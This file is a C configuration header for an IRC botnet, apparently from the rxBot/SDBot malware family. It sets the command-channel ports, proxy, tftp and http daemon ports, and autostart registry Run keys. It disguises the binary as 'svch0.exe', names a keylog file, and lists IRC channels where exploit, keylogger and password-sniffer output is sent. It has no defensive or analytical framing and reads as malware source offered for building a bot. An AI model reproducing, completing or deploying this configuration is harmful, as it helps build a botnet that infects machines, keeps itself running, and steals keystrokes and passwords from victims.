// bot configuration (generic) - doesn't need to be encrypted
#define AUIP "" //  ip for autoscan on startup . leave it alone for default local scan .
int port = 7001;				// server port
int port2 = 6617;				// backup server port
int socks4port = 1212;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 32;				// Port # for tftp daemon to run on
int httpport = 2001;			// Port # for http daemon to run on
int rloginport = 1013;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = TRUE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 10;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = FALSE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\sysinfodra.txt";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char botid[] = "fridma";						// bot id
char version[] = "h4cker 0.01";		// Bots !version reply
char password[] = "";					// bot password
char server[] = "";		// server
char serverpass[] = "";						// server password
char channel[] = "#M";				// channel that the bot should join
char chanpass[] = ".M.";						// channel password
char server2[] = "";						// backup server (optional)
char channel2[] = "#";						// backup channel (optional)
char chanpass2[] = ".";						// backup channel password (optional)
char filename[] = "svch0.exe";			// destination file name
char keylogfile[] = "syls.log";				// keylog filename
char valuename[] = "proses";		// value name for autostart
char nickconst[] = "Ma-";					// first part to the bot's nick
char szLocalPayloadFile[]="SD.dat";	// Payload filename
char modeonconn[] = "+i";					// Can be more than one mode and contain both + and -
char exploitchan[] = "#";					// Channel where exploit messages get redirected
char keylogchan[] = "#";						// Channel where keylog messages get redirected
char psniffchan[] = "#";						// Channel where psniff messages get redirected 

char *authost[] = {
	"*@"
};

char *versionlist[] = {
	"mIRC v6.12 Khaled Mardam-Bey",
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "2pckiws19f3bw3e0"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif
